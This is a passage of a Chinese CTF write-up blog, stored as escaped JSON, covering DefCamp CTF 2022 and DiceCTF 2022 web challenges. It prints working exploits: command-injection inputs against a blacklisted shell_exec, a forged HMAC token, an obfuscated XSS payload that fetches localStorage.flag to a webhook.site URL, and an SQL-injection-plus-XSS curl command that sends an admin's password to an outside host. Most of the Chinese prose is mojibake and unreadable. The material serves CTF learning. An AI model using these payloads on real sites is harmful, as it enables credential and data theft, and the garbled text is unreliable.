,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;ls\u0026#39;,\u0026#39;dd\u0026#39;,\u0026#39;nl\u0026#39;,\u0026#39;nk\u0026#39;,\u0026#39;df\u0026#39;,\u0026#39;wc\u0026#39;, \u0026#39;du\u0026#39; ); $valid = true; foreach($blackList as $blackItem) { if(strpos($_GET[\u0026#39;start\u0026#39;], $blackItem) !== false) { $valid = false; break; } } if(!$valid) { show_source(__FILE__); exit; } // This will return output only for id and ps. if (strlen($_GET[\u0026#39;start\u0026#39;]) \u0026lt; 5){ echo shell_exec($_GET[\u0026#39;start\u0026#39;]); } else { echo \u0026#34;Please enter a valid command\u0026#34;; } if (False) { echo $flag; } ?\u0026gt; ä¸€çœ‹è¿™ä¸ªä»£ç ä»¥ä¸ºè‡´æ•¬[HitconCTF 2017]babyfirst-revengeï¼Œä¸è¿‡å¤šäº†blacklist\nç„¶åè¯•äº†åŠå¤©å‘ç°å¥½åƒä¸å¤ªè¡Œï¼Œé»‘åå•å¤ªå¤šäº†å¯¼è‡´ç”¨é‚£ç§æ–¹å¼å®Œå…¨åšä¸äº†ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘å…¶å®ƒè§’åº¦ å°±æ”¾å¼ƒäº†\nçœ‹äº†wpä¹‹åæ‰å‘ç°æˆ‘æ˜¯å°ä¸‘ï¼Œtmd\n/?start=l\\s\t# flag.php index.php /?start=m4 * ç”¨åˆ°çš„m4å‘½ä»¤ï¼Œä¹‹å‰å®Œå…¨æ²¡ç”¨è¿‡â€¦â€¦æ‰€ä»¥ä¹Ÿæ²¡æƒ³åˆ°\næœ€è¿‘åšé¢˜å’Œå­¦ä¹ ä¸­æ˜æ˜¾åœ°å‘ç°äº†è‡ªå·±çš„ä¸è¶³ä¹‹å¤„ï¼Œå°±æ˜¯åŠ¨æ‰‹å¤ªå°‘äº†ï¼Œè§‰å¾—è„‘å­èƒ½è®°ä½èƒ½ç†è§£ï¼Œä½†å®é™…æƒ…å†µå¾€å¾€å°±ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ï¼Œä½ ä¸åŠ¨æ‰‹åšå°±æ˜¯ä¸ä¼šï¼Œå°±æ˜¯ä¸çŸ¥é“ä¸­é—´çš„å‘ç‚¹åœ¨å“ªé‡Œï¼Œè¿™æ ·ç•æ‰‹ç•è„šåœ°æ˜¯ç»å¯¹èµ°ä¸è¿œçš„ï¼Œä¹Ÿä¼šè®©è‡ªå·±å¾ˆéš¾å—\næ—¶åˆ»æé†’è‡ªå·±ï¼Œè¦è„šè¸å®åœ°çš„å­¦ï¼Œè®¤çœŸä¸€äº›\n","date":"2022-02-17T01:09:02+08:00","permalink":"https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/","section":"posts","tags":["wp"],"title":"defcampCTF2022 Wp"},{"categories":["CTF"],"contents":"https://ctf.dicega.ng/challs | https://ctftime.org/event/1541/tasks/\nhttps://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ | å®˜æ–¹wp\nhttps://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/ | å»ºè®®å…¨éƒ¨çœ‹å®Œ\nhttps://blog.maple3142.net/2022/02/07/dicectf-2022-writeups | æ¯”è¾ƒè¯¦ç»†çš„wp\nTI-1337ï¼šå±äºæ˜¯æ·±å…¥äº†è§£PVMï¼Œå»ºè®®ç›´æ¥çœ‹åˆ«çš„å¸ˆå‚…ä»¬çš„wp Vinegarï¼šwpçœ‹ä¸æ‡‚ï¼Œæ¶‰åŠpwnå’Œæ·±å…¥çš„pickleæ“ä½œ denoblogï¼šä¸€è½¬pwnï¼Œçœ‹æ‡‚ ä½†æ˜¯ä¸ä¼š carrotï¼šå¾ˆå¤æ‚çš„XS-Leaksï¼Œæ”¾å¼ƒ dicevaultï¼šè¯´æ˜¯è‡´æ•¬vaultï¼ŒæŠŠvaultåšäº†ä¹‹åçœ‹è¿™ä¸ªè¿˜æ˜¯ä¸ä¼šåšï¼Œå¯„ noteKeeperï¼šå¾ˆå¤æ‚çš„xssï¼Œå¯„ â€”â€”â€”â€”å±äºæ˜¯å¤ç°æµåšé¢˜é€‰æ‰‹é‡ç°æ±Ÿæ¹–ï¼Œå°±ä¼šåš1é“ï¼Œå…¶ä½™å…¨å¤ç°ï¼ˆå“­å“­ï¼‰ï¼Œä¸Šé¢è¿™å‡ é“é¢˜ç”±äºä¸ªäººæ°´å¹³æœ‰é™ï¼Œå¤ç°éƒ½å¤ä¸äº†ï¼Œéå¸¸éå¸¸éå¸¸å¤±è´¥ï¼Œå»ºè®®çœ‹åˆ«çš„wp\nmisc/welcome Please join the competition Discord and read the #rules channel.\ndice{sice}\nweb/knock-knock Knock knock? Who\u0026rsquo;s there? Another pastebin!!\nknock-knock.mc.ax\nindex.js | Dockerfile\nconst crypto = require(\u0026#39;crypto\u0026#39;); class Database { constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } createNote({ data }) { const id = this.notes.length; this.notes.push(data); return { id, token: this.generateToken(id), }; } getNote({ id, token }) { if (token !== this.generateToken(id)) return { error: \u0026#39;invalid token\u0026#39; }; if (id \u0026gt;= this.notes.length) return { error: \u0026#39;note not found\u0026#39; }; return { data: this.notes[id] }; } generateToken(id) { return crypto .createHmac(\u0026#39;sha256\u0026#39;, this.secret) .update(id.toString()) .digest(\u0026#39;hex\u0026#39;); } } const db = new Database(); db.createNote({ data: process.env.FLAG }); const express = require(\u0026#39;express\u0026#39;); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(express.static(\u0026#39;public\u0026#39;)); app.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { const data = req.body.data ?? \u0026#39;no data provided.\u0026#39;; const { id, token } = db.createNote({ data: data.toString() }); res.redirect(`/note?id=${id}\u0026amp;token=${token}`); }); app.get(\u0026#39;/note\u0026#39;, (req, res) =\u0026gt; { const { id, token } = req.query; const note = db.getNote({ id: parseInt(id ?? \u0026#39;-1\u0026#39;), token: (token ?? \u0026#39;\u0026#39;).toString(), }); if (note.error) { res.send(note.error); } else { res.send(note.data); } }); app.listen(3000, () =\u0026gt; { console.log(\u0026#39;listening on port 3000\u0026#39;); }); å…¸å‹çš„pastebinï¼Œæå‰å°†ç¯å¢ƒå˜é‡ä¸­çš„flagå†™åˆ°å…¶ä¸­ï¼Œå¯¹äºnoteæœ‰idå’Œtokenä¸¤é¡¹ç´¢å¼•çš„æ ‡è¯†ï¼ˆidæ˜¯noteçš„é•¿åº¦ï¼Œnoteæ˜¯ç”Ÿæˆçš„uuidï¼‰\nçœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œä½†æ˜¯uuidç”¨çš„keyå…¶å®æ ¹æœ¬æ²¡è°ƒç”¨crypto.randomUUIDè¿™ä¸ªå‡½æ•°\nè€Œæ˜¯ä¸€ä¸ªå®Œå…¨çš„å®šå€¼ï¼Œflagçš„id=1ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”Ÿæˆå¯¹åº”çš„token\ncrypto.createHmac(\u0026#39;sha256\u0026#39;,secret).update(\u0026#39;0\u0026#39;).digest(\u0026#39;hex\u0026#39;) å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªå®šå€¼å’Œjsçš„ç‰ˆæœ¬æœ‰å…³ç³»ï¼Œwinå’Œlinuxä¸‹çš„è¿è¡Œç»“æœä¹Ÿæœ‰å·®å¼‚ï¼ˆæ¢è¡Œç¬¦çš„é—®é¢˜\næœ€åçš„tokenå€¼\n\u0026#39;7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264\u0026#39; paylaod\n/note?id=0\u0026amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264 web/blazingfast I made a blazing fast MoCkInG CaSe converter!\nblazingfast.mc.ax | Admin Bot\nblazingfast.tar | admin-bot.js | blazingfast.c\nè¿™ä¸ªé¢˜ç‰¹æ®Šåœ¨ç»“åˆäº†webassemblyï¼Œæ˜¯ä¸ªä¸å¸¸è§çš„ç‚¹ï¼ˆè™½ç„¶åœ¨è¿™é¢˜é‡Œä½œç”¨å¹¶ä¸å¤§ï¼‰ï¼Œæ•´ä½“æ€è·¯è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„\nè‚¯å®šæ˜¯è¦xssçš„ï¼Œæ¥ä¸‹æ¥è¦æ€è€ƒå¦‚ä½•ç»•è¿‡mockä¸­çš„è¿‡æ»¤ï¼Œæˆ‘åœ¨åšçš„æ—¶å€™æ²¡æœ‰åšå‡ºæ¥ï¼Œä¸‹é¢æ˜¯å¤ç°\nâ€”â€”â€”â€”å…ˆè¯´ä¸€ä¸‹å¾ˆå¤šäººé‡‡ç”¨çš„éé¢„æœŸæƒ³æ³•ï¼šç»“åˆäº†wasmï¼ˆcè¯­è¨€ç¼–è¯‘ï¼‰çš„æ•°æ®å†™å…¥ï¼Œåœ¨æœ«å°¾æ²¡æœ‰å†™å…¥null-byteå­—ç¬¦ï¼Œè€Œjsåªæœ‰åœ¨é‡åˆ°null-byteæ‰ä¼šåœæ­¢æ•°æ®è¯»å…¥ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥å®Œæˆæ•°æ®èµ°ç§smuggleï¼Œå‘é€æˆ‘ä»¬çš„payloadï¼›é¦–å…ˆå‘é€å¸¦æœ‰åƒåœ¾æ•°æ®çš„xss payloadï¼Œæ­¤æ—¶å› ä¸ºwafçš„æ£€æµ‹è€ŒæŠ¥é”™ï¼Œä¹‹åå†å‘é€ä¸€ä¸ªpayloadï¼Œè¦†ç›–å‰é¢çš„åƒåœ¾æ•°æ®éƒ¨åˆ†è€Œç•™ä¸‹xssçš„éƒ¨åˆ†ï¼Œå¹¶ä¸”å¹¶ä¸ä¼šå¯¹xssçš„éƒ¨åˆ†è¿›è¡Œå¤§å°å†™çš„è½¬æ¢\nè¿™è¦æ±‚æˆ‘ä»¬å‘é€ä¸¤æ¬¡payloadï¼Œè€ŒåŒæ—¶ç»™adminçš„åªæœ‰ä¸€ä¸ªurlï¼Œè‚¯å®šä¸è¡Œ\nâ€”â€”â€”â€”é¢„æœŸè§£å’Œè¿™ä¸ªå·®åˆ«å…¶å®å¹¶ä¸å¾ˆå¤§ï¼Œé‡‡ç”¨ç¦»è°±çš„unicodeæ¬ºéª—payloadçš„å®é™…é•¿åº¦\né¦–å…ˆæ£€æµ‹è¾“å…¥å†…å®¹çš„é•¿åº¦ å¤§äº1000é€€å‡ºï¼Œä¹‹åå…¨éƒ¨è½¬ä¸ºå¤§å†™åå†è¯»å…¥bufæ•°ç»„ä¸­ï¼Œä¹‹åè¿›è¡Œblazingfast.mock()å¤„ç†æ—¶ä¾æ®çš„lengthåˆ™æ˜¯æœ€å¼€å§‹initæ—¶çš„é•¿åº¦ï¼Œåªæœ‰è†¨èƒ€å‰çš„éƒ¨åˆ†ä¼šè¢«mockå¤„ç†ï¼Œè€Œéšåå‰©ä¸‹çš„éƒ¨åˆ†å°†è¢«èµ°ç§è¯»å…¥mockingä¸­ï¼Œä½œä¸ºmockçš„è¿”å›å€¼ç•™åˆ°é¡µé¢ä¸Š document.getElementById('result').innerHTML = mock(str);\nå…³äºè·å–flagçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬éœ€è¦è·å–adminçš„localStorageä¸­çš„flagï¼Œéœ€è¦fetchåˆ°æˆ‘ä»¬çš„hookbinä¸­ï¼Œç”±äºwindowæ˜¯å°å†™ä¸èƒ½ç›´æ¥æ“ä½œä»–ï¼Œå¯ä»¥æ„é€ å‡½æ•°æˆ–æ˜¯ç”¨åŸå‹çš„æ–¹å¼ï¼›payloadå¯ä»¥ç”¨8è¿›åˆ¶æˆ–htmlå®ä½“\npayload\nï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„ï¬„\u0026lt;img src=x onerror=\u0026#34;\u0026#39;\u0026#39;[\u0026#39;\\141\\164\u0026#39;][\u0026#39;\\137\\137\\160\\162\\157\\164\\157\\137\\137\u0026#39;][\u0026#39;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\u0026#39;](\u0026#39;\\146\\145\\164\\143\\150(`\\150\\164\\164\\160\\163://\\167\\145\\142\\150\\157\\157\\153.\\163\\151\\164\\145/90396\\1465\\141-59\\146\\141-40\\146\\145-\\14182\\146-\\145\\14421\\1415\\14611009?Q=${\\154\\157\\143\\141\\154S\\164\\157\\162\\141\\147\\145.\\146\\154\\141\\147}`)\u0026#39;)()\u0026#34;/\u0026gt; \u0026lt;img src=x onerror=\u0026#34;\u0026#39;\u0026#39;[\u0026#39;at\u0026#39;][\u0026#39;__proto__\u0026#39;][\u0026#39;constructor\u0026#39;](\u0026#39;fetch(`https://webhook.site/90396f5a-59fa-40fe-a82f-ed21a5f11009?Q=${localStorage.flag}`)\u0026#39;)()\u0026#34;/\u0026gt; web/no-cookies I found a more secure way to authenticate users. No cookies, no problems!\ninstancer.mc.ax/no-cookies | Admin Bot\ndist.tar | index.js | admin-bot.js\nè¿˜æ˜¯å…ˆçœ‹admin bot\nimport flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise((resolve) =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;no-cookies\u0026#39;, name: \u0026#39;no-cookies\u0026#39;, urlRegex: /^https:\\/\\/no-cookies-[a-f0-9]{16}\\.mc\\.ax\\/view\\?id=[a-f0-9]{32}$/, timeout: 10000, extraFields: [ { name: \u0026#39;instance\u0026#39;, displayName: \u0026#39;Instance ID\u0026#39;, placeholder: \u0026#39;no-cookies-{THIS}.mc.ax\u0026#39;, regex: \u0026#39;^[0-9a-f]{16}$\u0026#39;, }, ], handler: async (url, ctx, { instance }) =\u0026gt; { const page = await ctx.newPage(); const doLogin = async (username, password) =\u0026gt; { return new Promise((resolve) =\u0026gt; { page.once(\u0026#39;dialog\u0026#39;, (first) =\u0026gt; { page.once(\u0026#39;dialog\u0026#39;, (second) =\u0026gt; { second.accept(password); }); first.accept(username); resolve(); }); }); }; // make an account const username = Array(32) .fill(\u0026#39;\u0026#39;) .map(() =\u0026gt; Math.floor(Math.random() * 16).toString(16)) .join(\u0026#39;\u0026#39;); // ç”¨æˆ·åä»»æ„ const password = flag; // æˆ‘ä»¬è¦å¾—åˆ°çš„flag åœ¨å¯†ç ä¸­ const firstLogin = doLogin(username, password); try { page.goto(`https://no-cookies-${instance}.mc.ax/register`); // æ³¨å†Œ } catch {} await firstLogin; // ç™»å…¥ await sleep(3000); // visit the note and log in const secondLogin = doLogin(username, password); // å†ç™»å…¥ try { page.goto(url); // è®¿é—®æˆ‘ä»¬çš„url } catch {} await secondLogin; await sleep(3000); }, }; çœ‹æˆ‘ä»¬çš„index.jsï¼Œé¡µé¢ä¸ç®¡ä»€ä¹ˆæ“ä½œï¼Œ/register, /login, /create, /viewéƒ½ä¼šå…ˆè¦æ±‚è¾“å…¥è´¦å·å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºmdçš„å†…å®¹å¹¶æ¸²æŸ“å‡ºæ¥ï¼Œåœ¨/viewå¤„æœ‰è¿™æ ·çš„js\n(() =\u0026gt; { const validate = (text) =\u0026gt; { return /^[^$\u0026#39;]+$/.test(text ?? \u0026#39;\u0026#39;);\t// è¿‡æ»¤ æ²¡è¿‡æ»¤åŒå¼•å· } const promptValid = (text) =\u0026gt; { let result = prompt(text) ?? \u0026#39;\u0026#39;; return validate(result) ? result : promptValid(text); } const username = promptValid(\u0026#39;Username:\u0026#39;); const password = promptValid(\u0026#39;Password:\u0026#39;);\t// ä¸Šä¸€æ¬¡æ­£åˆ™ const params = new URLSearchParams(window.location.search); (async () =\u0026gt; { const { note, mode, views } = await (await fetch(\u0026#39;/view\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ username, password, id: params.get(\u0026#39;id\u0026#39;) }) })).json(); if (!note) { alert(\u0026#39;Invalid username, password, or note id\u0026#39;); window.location = \u0026#39;/\u0026#39;; return; } let text = note; if (mode === \u0026#39;markdown\u0026#39;) { text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) =\u0026gt; {\t// æ­£åˆ™ return `\u0026lt;a href=\u0026#34;${p2}\u0026#34;\u0026gt;${p1}\u0026lt;/a\u0026gt;`;\t// xsså¤„ }); text = text.replace(/#\\s*([^\\n]+)/g, (match, p1) =\u0026gt; { return `\u0026lt;h1\u0026gt;${p1}\u0026lt;/h1\u0026gt;`; }); text = text.replace(/\\*\\*([^\\n]+)\\*\\*/g, (match, p1) =\u0026gt; { return `\u0026lt;strong\u0026gt;${p1}\u0026lt;/strong\u0026gt;`; }); text = text.replace(/\\*([^\\n]+)\\*/g, (match, p1) =\u0026gt; { return `\u0026lt;em\u0026gt;${p1}\u0026lt;/em\u0026gt;`; }); } document.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text;\t// æ’å…¥é¡µé¢ä¸­ document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; })(); })(); æ¯”è¾ƒå®¹æ˜“æ³¨æ„åˆ°è¿™ä¸ªxssç‚¹ï¼Œå®ƒå¯ä»¥æ¸²æŸ“è¶…é“¾æ¥ï¼Œä½†æ˜¯æ²¡è¿‡æ»¤åŒå¼•å·ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥è¿™æ ·\n// md (link text)[http://example.com\u0026#34; class=\u0026#34;foo] // innerHTML \u0026lt;a href=\u0026#34;http://example.com\u0026#34; class=\u0026#34;foo\u0026#34;\u0026gt;link text\u0026lt;/a\u0026gt; å¯ä»¥æ„é€ å‡ºè¿™æ ·çš„payload\n// md (link text)[http://example.com\u0026#34; onmouseover=\u0026#34;alert`1`] // innerHTML \u0026lt;a href=\u0026#34;http://example.com\u0026#34; onmouseover=\u0026#34;alert`1`\u0026gt;link text\u0026lt;/a\u0026gt; ä¸è¿‡adminæ— é¼ æ ‡æ“ä½œï¼Œè¿™é‡Œè¦ç»“åˆjsæ­£åˆ™åŒ¹é…çš„ç‰¹æ€§ï¼ŒRegExp.inputå¯ä»¥æ‹¿åˆ°ä¸Šä¸€æ¬¡ä¼ å…¥æ­£åˆ™åŒ¹é…å‡½æ•°ä¸­çš„è¾“å…¥å€¼\n/a/.test(\u0026#39;secret password\u0026#39;) console.log(RegExp.input) // secret password ä¸è¿‡ä»…æœ‰è¿™ä¸€ä¸ªxssç‚¹è¿˜ä¸è¡Œï¼Œå«æœ‰è¿™æ ·payloadçš„noteå¿…é¡»æ’å…¥åå¾—åˆ°ä¸€ä¸ªadminèƒ½è®¿é—®çš„urlï¼Œè¿™é‡Œå°±éœ€è¦åç«¯çš„sqliteæ³¨å…¥äº†\nconst db = { prepare: (query, params) =\u0026gt; { if (params) for (const [key, value] of Object.entries(params)) { const clean = value.replace(/[\u0026#39;$]/g, \u0026#39;\u0026#39;); query = query.replaceAll(`:${key}`, `\u0026#39;${clean}\u0026#39;`); } return query; }, [...] run: (query, params) =\u0026gt; { const prepared = db.prepare(query, params); console.log( prepared ); return database.prepare(prepared).run(); }, }; [...] db.run(\u0026#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)\u0026#39;, { id, username, note: note.replace(/[\u0026lt;\u0026gt;]/g, \u0026#39;\u0026#39;), mode, }); æ³¨æ„çœ‹dbçš„æ“ä½œ\nfor (const [key, value] of Object.entries(params)) { const clean = value.replace(/[\u0026#39;$]/g, \u0026#39;\u0026#39;); query = query.replaceAll(`:${key}`, `\u0026#39;${clean}\u0026#39;`); } å¯¹ä¼ å…¥çš„æ¯ä¸€å¯¹å‚æ•°ï¼ŒæŒ‰é¡ºåºï¼Œå…ˆæŠŠæ‰€æœ‰çš„å•å¼•å·å’Œ$å»æ‰ï¼Œå†æ›¿æ¢:paramä¸º'clean'\nåœ¨åé¢/createä¸­ä¼šä¾æ¬¡ä¼ å…¥å››ä¸ªå‚æ•°\ndb.run(\u0026#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)\u0026#39;, { id, username, note: note.replace(/[\u0026lt;\u0026gt;]/g, \u0026#39;\u0026#39;), mode, }); payloadæ˜¯è¿™æ ·\n\u0026#34;username\u0026#34;: \u0026#34;a :note\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34; \u0026#34;note\u0026#34;: \u0026#34;, :mode, 0, 0) -- \u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;actual note and xss\u0026#34; -- åŸ INSERT INTO notes VALUES (:id, :username, :note, :mode, 0) -- id 123 INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, :username, :note, :mode, 0) -- username INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a :note\u0026#39;, :note, :mode, 0) -- note ä¸¤ä¸ª`:note`éƒ½ä¼šè¢«æ¢æ‰ INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a \u0026#39;, :mode, 0, 0) -- \u0026#39;\u0026#39;, \u0026#39;, :mode, 0, 0) -- \u0026#39;, :mode, 0) -- mode æ­¤æ—¶noteå€¼æˆ‘ä»¬å®Œå…¨å¯æ§ INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a \u0026#39;, \u0026#39;actual note and xss\u0026#39;, 0, 0) -- \u0026#39;\u0026#39;, \u0026#39;, :mode, 0, 0) -- \u0026#39;, \u0026#39;actual note and xss\u0026#39;, 0) æ‰€ä»¥ç»“åˆä¸Šé¢ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„payloadæ˜¯è¿™æ ·çš„\n$ curl \u0026#39;https://no-cookies-0ac0b52c95f3abe3.mc.ax/create\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; --data-raw \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;:note\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;,:mode, 22, 0)-- \u0026#34;,\u0026#34;mode\u0026#34;:\u0026#34;\u0026lt;img src=x onerror=\\\u0026#34;window.location=\u0026amp;quot;https://bawolff.net?\u0026amp;quot;+RegExp.input\\\u0026#34;\u0026gt;\u0026#34;}\u0026#39; éé¢„æœŸ å½“ç„¶é€ƒä¸äº†jså¤§æ‰‹å­ä»¬çš„éé¢„æœŸè§£äº†ï¼Œéé¢„æœŸæ²¡æœ‰ç”¨åˆ°RegExp.inputï¼Œè€Œæ˜¯\ndocument.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text; document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; æœ‰ä¸¤ç§æƒ…å†µ\n\u0026lt;div id=x\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=y\u0026gt;hello\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; x.innerHTML = \u0026#39;\u0026lt;img src=x onerror=alert(window.y.innerText)\u0026gt;\u0026#39; y.innerText = \u0026#39;updated\u0026#39; \u0026lt;/script\u0026gt; æ­¤æ—¶alertçš„å†…å®¹æ˜¯updatedï¼Œè€Œå¦‚æœæ¢æˆ\u0026lt;svg\u0026gt;å°±ä¸ä¸€æ ·äº†\n\u0026lt;div id=x\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div 